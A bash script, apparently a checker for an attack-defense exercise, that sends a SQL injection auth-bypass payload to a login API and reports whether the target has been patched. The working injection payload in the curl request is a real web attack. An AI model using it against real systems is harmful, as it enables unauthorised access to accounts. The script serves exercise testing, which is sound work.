#!/usr/bin/env bash
# SQL injection — auth bypass against /api/v1/auth.
# The endpoint interpolates `username` / `password` into a SQL WHERE clause
# unparameterized, so `' OR '1'='1' -- ` in either field returns the first
# row. The patched defender's response is HTTP 4xx or "auth failed"; the
# unpatched defender returns a username back.
#
# Inputs:
#   $1 or $API_URL   — base API URL, e.g. http://<host>:8080
#
# Output one line:
#   OK    — defender has patched (no SQLi)
#   FAIL  — SQLi succeeded (defender hasn't patched)
#   ERR   — request failed (network / target down)

set -euo pipefail

API_URL="${1:-${API_URL:?API_URL required}}"

response=$(
  curl --silent --show-error --max-time 5 \
    -X POST "${API_URL}/api/v1/auth" \
    -H "Content-Type: application/json" \
    -d $'{"username":"admin\\\' OR \\\'1\\\'=\\\'1\\\' -- ","password":"x"}' \
    -w '\nHTTP_STATUS:%{http_code}\n' \
  || echo "HTTP_STATUS:000"
)

status=$(printf '%s\n' "$response" | sed -n 's/^HTTP_STATUS://p' | tail -n1)
body=$(printf '%s\n' "$response" | sed '/^HTTP_STATUS:/d')

if [[ "$status" == "000" ]]; then
  echo "ERR sqli-auth-bypass ${API_URL} (network)"
  exit 2
fi

# Heuristic: unpatched response surfaces a username string when the SQLi
# bypasses the predicate. Patched responses return 4xx or an "auth failed"
# string with no username.
if [[ "$status" == "200" && "$body" == *"username"* ]]; then
  echo "FAIL sqli-auth-bypass ${API_URL} (SQLi succeeded, status=${status})"
  exit 1
fi

echo "OK   sqli-auth-bypass ${API_URL} (patched, status=${status})"
